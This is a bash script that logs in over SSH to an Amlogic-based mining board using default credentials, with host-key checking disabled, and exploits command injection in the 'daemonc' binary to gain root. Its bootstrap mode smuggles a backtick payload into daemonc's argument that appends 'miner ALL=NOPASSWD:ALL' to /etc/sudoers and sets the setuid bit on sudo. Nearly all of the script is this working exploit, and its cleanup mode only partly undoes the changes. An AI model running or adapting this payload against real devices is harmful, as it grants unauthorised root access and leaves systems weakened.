#!/usr/bin/env bash
set -euo pipefail

HOST="192.168.1.52"
PORT="22"
USER_NAME="miner"
PASSWORD="${PASSWORD:-miner}"
MODE="probe"

usage() {
  cat <<'EOF'
Usage:
  ./amlogic_bootstrap.sh [probe|bootstrap|cleanup] [options]

Modes:
  probe
    Check whether the stock board matches the bootstrap assumptions.
  bootstrap
    Run the daemonc payload, then verify sudo works.
  cleanup
    Remove the NOPASSWD sudoers line added by bootstrap and verify sudo -n
    is blocked again.

Options:
  --host IP_OR_HOSTNAME   Target miner (default: 192.168.1.52)
  --port PORT             SSH port (default: 22)
  --user USERNAME         SSH username (default: miner)
  --password PASSWORD     SSH password (default: miner)
  --help                  Show this message

Examples:
  ./amlogic_bootstrap.sh probe
  ./amlogic_bootstrap.sh bootstrap --host 192.168.1.52
  ./amlogic_bootstrap.sh cleanup
EOF
}

die() {
  echo "ERROR: $*" >&2
  exit 1
}

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || die "Missing required command: $1"
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    probe|bootstrap|cleanup)
      MODE="$1"
      shift
      ;;
    --host)
      HOST="${2:-}"
      shift 2
      ;;
    --port)
      PORT="${2:-}"
      shift 2
      ;;
    --user)
      USER_NAME="${2:-}"
      shift 2
      ;;
    --password)
      PASSWORD="${2:-}"
      shift 2
      ;;
    --help|-h)
      usage
      exit 0
      ;;
    *)
      die "Unknown argument: $1"
      ;;
  esac
done

need_cmd ssh
need_cmd sshpass

SSH_TARGET="${USER_NAME}@${HOST}"
SSH_BASE=(
  sshpass -p "${PASSWORD}"
  ssh
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o LogLevel=ERROR
  -o ConnectTimeout=10
  -p "${PORT}"
  "${SSH_TARGET}"
)

remote_run() {
  local cmd="$1"
  "${SSH_BASE[@]}" "sh -lc $(printf '%q' "${cmd}")" </dev/null
}

probe() {
  echo "Target: ${HOST}:${PORT}"
  remote_run '
    echo "identity=$(id)"
    echo "kernel=$(uname -a)"
    printf "daemonc="; command -v daemonc || true
    printf "sudo_mode="; ls -l /usr/bin/sudo 2>/dev/null || true
    sudo -k 2>/dev/null || true
    if sudo -n id -un >/tmp/amlogic_probe.out 2>/tmp/amlogic_probe.err; then
      printf "sudo_n="
      cat /tmp/amlogic_probe.out
    else
      printf "sudo_n_blocked="
      tr "\n" " " </tmp/amlogic_probe.err
      echo
    fi
    rm -f /tmp/amlogic_probe.out /tmp/amlogic_probe.err
  '
}

bootstrap() {
  echo "Running exact daemonc bootstrap payload on ${HOST}:${PORT}"
  remote_run "daemonc \"\\\`echo 'miner ALL=NOPASSWD:ALL'>>/etc/sudoers && chmod +s /usr/bin/sudo\\\`\" || true"
  echo "Verifying sudo escalation"
  remote_run '
    sudo -n id -un
    sudo -n grep -n "miner ALL=NOPASSWD:ALL" /etc/sudoers || true
    ls -l /usr/bin/sudo 2>/dev/null || true
  '
}

cleanup() {
  echo "Removing bootstrap sudoers line from ${HOST}:${PORT}"
  remote_run '
    tmp="/tmp/sudoers.clean.$$"
    sudo -n sh -c "grep -v \"miner ALL=NOPASSWD:ALL\" /etc/sudoers > ${tmp} && cat ${tmp} > /etc/sudoers && chmod 0440 /etc/sudoers && rm -f ${tmp}"
    sudo -n -k 2>/dev/null || true
    if sudo -n id -un >/tmp/amlogic_cleanup.out 2>/tmp/amlogic_cleanup.err; then
      printf "cleanup_result=still_has_passwordless_sudo:"
      cat /tmp/amlogic_cleanup.out
    else
      printf "cleanup_result="
      tr "\n" " " </tmp/amlogic_cleanup.err
      echo
    fi
    rm -f /tmp/amlogic_cleanup.out /tmp/amlogic_cleanup.err
  '
}

case "${MODE}" in
  probe)
    probe
    ;;
  bootstrap)
    bootstrap
    ;;
  cleanup)
    cleanup
    ;;
esac
